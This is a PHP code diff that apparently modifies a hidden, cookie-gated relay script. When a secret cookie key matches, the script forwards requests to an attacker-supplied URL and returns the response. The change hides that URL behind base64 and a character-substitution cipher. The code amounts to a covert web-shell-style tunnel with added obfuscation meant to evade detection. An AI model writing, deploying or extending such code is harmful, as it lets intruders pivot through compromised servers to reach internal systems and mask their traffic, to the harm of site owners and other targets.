@@ -113,7 +113,8 @@ if ($_COOKIE["_k"] == "INSERT_KEY") {
 			$body = file_get_contents("php://input");
 		}
 		$headers = array();
-		$url_parts = parse_url($_COOKIE["_u"]);
+		$url = strtr(base64_decode($_COOKIE["_u"]), "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_:/?&=-%", "Z/zbluXpMj:?LImUD7rknPQEBef6iwJgR1-C%W5aH902GSN&O4dVKTxq3AYF8_c=vothys");
+		$url_parts = parse_url($url);
 		foreach ($assoc_headers as $key => $value) {
 			switch (strtolower($key)) {
 				case "host":
@@ -151,7 +152,7 @@ if ($_COOKIE["_k"] == "INSERT_KEY") {
 					break;
 			}
 		}
-		$req = _request($_COOKIE["_u"], $_SERVER["REQUEST_METHOD"], $body ? $body : null, $headers);
+		$req = _request($url, $_SERVER["REQUEST_METHOD"], $body ? $body : null, $headers);
 		if ($req) {
 			foreach ($req["headers"] as $header) header($header);
 			echo $req["body"];
